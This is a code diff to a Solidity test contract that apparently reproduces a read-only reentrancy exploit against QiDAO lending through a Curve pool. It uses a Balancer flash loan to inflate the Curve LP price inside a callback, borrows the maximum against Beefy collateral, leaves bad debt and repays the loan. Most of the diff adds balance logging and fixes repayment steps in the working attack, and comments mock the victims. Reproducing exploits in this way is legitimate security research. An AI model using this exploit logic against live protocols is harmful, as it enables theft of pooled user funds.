@@ -119,6 +119,8 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         _amounts[0] = 34580036532422811977431924;
         _amounts[1] = 19664260000000000000000000;
 
+        console.log("Attacker balance", address(this).balance);
+
         priceAtBeginning = get_lp_token_price_for_compound();
         console.log("==== INITIAL PRICE ====");
         console.log(priceAtBeginning);
@@ -129,8 +131,13 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         require(priceDuringCallback > priceAfterCallback, "Price during the attack smaller than the ending price");
     }
 
+    event Received(address, uint);
     receive() external payable {
-        _fallback();
+        if (msg.sender == address(WMATIC) || msg.sender == address(stLIDOMATIC)) {
+            emit Received(msg.sender, msg.value);
+        } else {
+            _fallback();
+        }
     }
 
     function _fallback() internal {
@@ -145,6 +152,9 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         console.log("\n==== PRICE DURING THE ATTACK (CALLBACK) ====");
         console.log(priceDuringCallback);
 
+        console.log("--> PRE-QI");
+        LOG_BALANCES();
+
         // Borrow as much as we can and then check that
         // everything went OK with the loan before returning
         // control to the calling function (removeLiquidity)
@@ -156,6 +166,10 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         uint256 maxBorrowUnderlying = liquidity / priceDuringCallback;
         uint256 code = QIDAO_DELEGATOR.borrow(maxBorrowUnderlying * 10**18);
         uint256 borrows = QIDAO_DELEGATOR.borrowBalanceCurrent(address(this));
+
+        console.log("--> POST-QI");
+        LOG_BALANCES();
+
 
         require(code == 0);
         require(borrows == maxBorrowUnderlying * 10**18);
@@ -173,13 +187,11 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
         require(address(tokens[0]) == address(WMATIC));
         require(address(tokens[1]) == address(stLIDOMATIC));
-        
-        console.log(IERC20(tokens[0]).balanceOf(address(this)));
-        console.log(IERC20(tokens[1]).balanceOf(address(this)));
-        console.log("qi", QIDAO.balanceOf(address(this)));
-       
-        console.log(address(this).balance);
 
+        console.log("== FLASH LOAN ==");
+        LOG_BALANCES();
+       
+        console.log("--> Starting a position on Compound... Depositing LP tokens into beefy to be used as collateral)...");
         
         // Add to the pool all my WMATIC and stLIDOMATIC, I will
         // receive LP tokens in return
@@ -188,7 +200,7 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
 
         uint256[2] memory addLiquidityAmounts = [amounts[1],
                                                  amounts[0]];
-        uint256 lp_tokens = CURVE_POOL.add_liquidity(addLiquidityAmounts, 0, false);
+        CURVE_POOL.add_liquidity(addLiquidityAmounts, 0, false);
 
         assertGe(CURVE_LP_TOKEN.balanceOf(address(this)), 0);
 
@@ -201,6 +213,8 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         markets[0] = address(BEEFY_DELEGATOR);
         UNITROLLER.enterMarkets(markets);
 
+        (uint error, uint liquidity, uint shortfall) = UNITROLLER.getAccountLiquidity(address(this));
+
         // deposit into beefy
         uint256 deposit_in_beefy = 90000000000000000000000;
         CURVE_LP_TOKEN.approve(address(BEEFY), deposit_in_beefy);
@@ -208,6 +222,7 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
 
         // mint collateral
         uint256 amount_in_beefy = BEEFY.balanceOf(address(this));
+        LOG_BALANCES();
         BEEFY.approve(address(BEEFY_DELEGATOR), amount_in_beefy);
         BEEFY_DELEGATOR.mint(amount_in_beefy);
 
@@ -226,14 +241,13 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
 
         // We now acquired a bad debt... good luck recovering your borrowed
         // amount though, liquidate all you want ;)
-        (uint error, uint liquidity, uint shortfall) = UNITROLLER.getAccountLiquidity(address(this));
+        (error, liquidity, shortfall) = UNITROLLER.getAccountLiquidity(address(this));
         require(error == 0, "yikes can't get our account liquidity");
         require(shortfall > 0, "i owe you and you will never catch me");
         require(liquidity == 0, "i can't take any more debt but who cares?");
 
         // We now have to repay the flashloan and be on our way.
         repayLoan(amounts);
-
     }
 
     function repayLoan(uint256[] memory amounts) internal {
@@ -245,15 +259,43 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         path[1] = address(USDC);
         path[2] = address(WMATIC);
 
+        console.log("== REPAY ==");
+        console.log("--> PRE-SWAP");
+        LOG_BALANCES();
+
         // We request the amount received as no fees were paid for this loan
         uint256 amountIn = QIDAO.balanceOf(address(this));
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 1, path, address(this), block.timestamp); // Qi Tokens for WMATIC
 
+        console.log("--> POST-SWAP");
+        LOG_BALANCES();
+
         WMATIC.approve(address(CURVE_POOL), type(uint256).max);
-        CURVE_POOL.exchange(1, 0, 20000000000000000000000, 8964360265059868271032, false); // ---------- THIS IS FAILING. Tried with locals (balanceOf) also.
-        WMATIC.deposit{value: address(this).balance}();
-        
+        CURVE_POOL.exchange(1, 0, 20000000000000000000000, 8964360265059868271032, false);
+
+        console.log("--> POST-EXCHANGE 1");
+        LOG_BALANCES();
+
+        //WMATIC.deposit{value: address(this).balance}();
+        // We need to make sure we have the right amounts here.
+        // XXX: there might be a problem with the WETH9/ERC20 interfaces
+        //      WETH9.transfer() works, but deducts from the contract itself, not the token - address(this).balance
+        //      ERC20.transfer() is not working at all. the trace will show as it succeeded, but the balances remain unaffected (both sender/receiver)
+        WMATIC.withdraw(WMATIC.balanceOf(address(this)));
+        console.log("--> WMATIC WITHDRAW");
+        LOG_BALANCES();
+
+        WMATIC.deposit{value: amounts[0]}();
         WMATIC.transfer(address(balancer), amounts[0]);
+
+        console.log("--> WMATIC PAID");
+        LOG_BALANCES();
+
+        stLIDOMATIC.transfer(address(this), stLIDOMATIC.balanceOf(address(this)));
+        console.log("--> stLIDOMATIC WITHDRAW");
+        LOG_BALANCES();
+
+        console.log("--> PAYING LIDOMATIC ", amounts[1]);
         stLIDOMATIC.transfer(address(balancer), amounts[1]);
     }
 
@@ -261,5 +303,15 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
     // Compound price's feed
     function get_lp_token_price_for_compound() internal view returns (uint256) {
         return PRICE_FEED.getUnderlyingPrice(address(BEEFY_DELEGATOR));
+    }
+
+    function LOG_BALANCES() internal view {
+        console.log("Curve LP tokens .....", CURVE_LP_TOKEN.balanceOf(address(this)));
+        console.log("AMounts in Beefy ....", BEEFY.balanceOf(address(this)));
+        console.log("WMATIC balance ......", WMATIC.balanceOf(address(this)));
+        console.log("stLIDOMATIC balance .", stLIDOMATIC.balanceOf(address(this)));
+        console.log("QI balance ..........", QIDAO.balanceOf(address(this)));
+        console.log("Attacker balance ....", address(this).balance);
+        console.log("");
     }
 }
